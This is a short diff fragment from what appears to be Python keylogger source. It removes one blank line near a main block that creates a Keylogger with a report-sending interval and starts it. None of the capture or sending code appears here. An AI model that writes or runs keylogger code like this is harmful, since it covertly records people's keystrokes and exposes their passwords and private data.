@@ -78,7 +78,6 @@ class Keylogger:
         self.semaphore.acquire()
 
     
-
 if __name__ == "__main__":
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
